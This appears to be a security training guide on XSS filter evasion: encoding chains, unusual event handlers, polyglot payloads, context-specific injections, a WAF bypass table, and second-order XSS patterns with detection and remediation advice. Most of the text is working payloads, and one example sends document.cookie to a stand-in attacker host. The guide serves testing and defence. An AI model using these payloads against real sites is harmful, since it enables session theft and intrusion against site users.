# 01 — Reflected & Stored XSS: Advanced Evasion

## Overview

Reflected and stored XSS remain the most prevalent XSS classes in real-world applications. Modern defenses — WAFs, framework-level escaping, and sanitizers — block naïve payloads. This document covers encoding chains, evasion techniques, second-order injection, and context-specific exploitation that bypass these controls.

---

## 1. Filter Bypass via Encoding Chains

WAFs inspect raw input; browsers perform multi-pass decoding. Encoding chains exploit this gap by delivering a payload that appears benign to the WAF but executes after browser-level decoding.

### HTML Entity Encoding

```html
<!-- Decimal entities — decoded by HTML parser -->
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>

<!-- Hex entities -->
<a href="&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;:alert(1)">XSS</a>
```

### URL Encoding (Double Encoded)

```
%253Cscript%253Ealert(1)%253C/script%253E
```

The server URL-decodes once (`%25` → `%`), leaving `%3Cscript%3E` in the HTML. The browser then decodes it a second time.

### Unicode Normalization

```javascript
\u006A\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074:alert(1)
```

JavaScript engines normalize Unicode escapes inside string literals and identifiers before evaluation.

---

## 2. Tag and Attribute Evasion

### Unusual Event Handlers

When `onload`, `onerror`, and `onclick` are blocked by name:

```html
<details open ontoggle=alert(1)>
<video autoplay onplay=alert(1)><source src=x></video>
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
<marquee onstart=alert(1)>XSS</marquee>
<body onpageshow=alert(1)>
```

### Attribute Delimiter Tricks

```html
<!-- No quotes needed in many parsers -->
<img src=x onerror=alert(1)>

<!-- Backtick as delimiter — works in older WebKit/IE; [LEGACY] for modern Chrome/Firefox -->
<img src=`javascript:alert(1)`>

<!-- Null byte injection — may bypass WAF regex patterns -->
<scr\x00ipt>alert(1)</scr\x00ipt>
```

---

## 3. Polyglot Payloads

Polyglots execute in multiple injection contexts simultaneously. Useful when the injection context is unknown.

```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>
```

```html
<!-- Works in HTML body, attribute, and JS string contexts -->
'"><img src=x onerror=alert(1)>
```

---

## 4. Context-Specific Injection

### Inside JavaScript Strings

```javascript
// Injection point: '; alert(1); //
var x = 'USER_INPUT';
// Becomes:
var x = ''; alert(1); //';
```

### Inside HTML Attributes

```html
<!-- href attribute — requires javascript: scheme -->
<a href="javascript:alert(1)">link</a>

<!-- Data attribute reflected into eval -->
<div data-value="USER">  →  eval(element.dataset.value)
```

### Inside JSON Responses

```
HTTP/1.1 200 OK
Content-Type: text/html  ← missing application/json causes browser to parse as HTML

{"user":"</script><script>alert(1)</script>"}
```

---

## 5. WAF Bypass Techniques

| WAF Rule Blocked | Bypass Technique |
|-----------------|-----------------|
| `<script>` tag | Case variation: `<ScRiPt>` |
| `alert(` | Template literal: `` alert`1` `` |
| `javascript:` | Mixed case: `jaVasCript:` |
| Event handler keywords | Unicode: `onc\u006Cick` |
| `/` in payload | Double URL encode: `%252F` |

---

## 6. Second-Order XSS

Second-order (or stored-then-triggered) XSS occurs when user input is safely stored, then later retrieved and rendered in an unsafe context — often by a different feature of the application that the original developer didn't associate with the injection point.

### How It Differs from First-Order Stored XSS

In first-order stored XSS, the payload is rendered on the same request or feature that accepted the input. In second-order XSS, the data traverses one or more backend processing steps before reaching a dangerous rendering context, bypassing defenses applied only at the input stage.

### Common Second-Order Patterns

**Pattern 1: Import/Export + Render**

```
User registers with username: <img src=x onerror=alert(1)>
Registration endpoint → escapes output → safely stored in DB
Admin panel generates a CSV export of all users → imports CSV back
Import feature renders the raw CSV value in a table without re-encoding
```

**Pattern 2: Logging Systems**

```
User sends request with User-Agent: <script>alert(1)</script>
Request logger stores raw User-Agent in DB
Admin "View Logs" page renders the stored value with innerHTML
```

**Pattern 3: Template / Message Queues**

```javascript
// Step 1: User submits bio
POST /profile  { bio: "<img src=x onerror=fetch('https://attacker.com/?c='+document.cookie)>" }
// Server stores it safely in DB (no XSS yet)

// Step 2: Admin views profile in a different internal tool that renders raw HTML
GET /admin/users/42 → admin tool renders bio field via dangerouslySetInnerHTML
```

### Detection Strategy

1. Inject a marker (e.g., `<b>xsstest42</b>`) and track it through every downstream feature: exports, admin panels, log viewers, email previews, PDF generators.
2. Check whether each rendering context applies output encoding independently or relies on upstream encoding.
3. Use a unique canary per injection point to correlate trigger events.

### Remediation

Encoding must be applied at the rendering site, not only at the input site. If a downstream component renders HTML, it must treat all data from the database as untrusted, regardless of how it was stored.

---

## References

- [OWASP XSS Filter Evasion Cheat Sheet](https://owasp.org/www-community/xss-filter-evasion-cheatsheet)
- [PortSwigger XSS Contexts](https://portswigger.net/web-security/cross-site-scripting/contexts)
- [Second-Order XSS — OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01.2-Testing_for_Stored_Cross_Site_Scripting)
- [PortSwigger Research: XSS Without Event Handlers](https://portswigger.net/research/xss-without-event-handlers)
